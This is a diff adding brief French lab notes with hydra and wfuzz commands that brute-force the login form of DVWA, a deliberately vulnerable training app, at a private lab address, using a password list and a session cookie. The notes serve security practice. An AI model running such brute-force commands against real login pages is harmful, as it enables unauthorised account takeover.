@@ -1,0 +1,10 @@
+# hydra exemple
+
+## avec message reussite
+hydra 192.168.56.71 -I -l admin -P ./liste_pass.txt -v http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=67ef5fc8dfe51b698b20352afdb190f1; security=low :S=Welcome to the password protected area admin"
+
+## avec message d'echec
+hydra 192.168.56.71 -I -l admin -P ./liste_pass.txt -v http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=67ef5fc8dfe51b698b20352afdb190f1; security=low :F=Username and/or password incorrect."
+
+## avec wfuzz
+wfuzz -H "Cookie:PHPSESSID=67ef5fc8dfe51b698b20352afdb190f1; security=low" --hs "Username and/or password incorrect." -c -z file,liste_pass.txt "http://192.168.56.71/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login#"
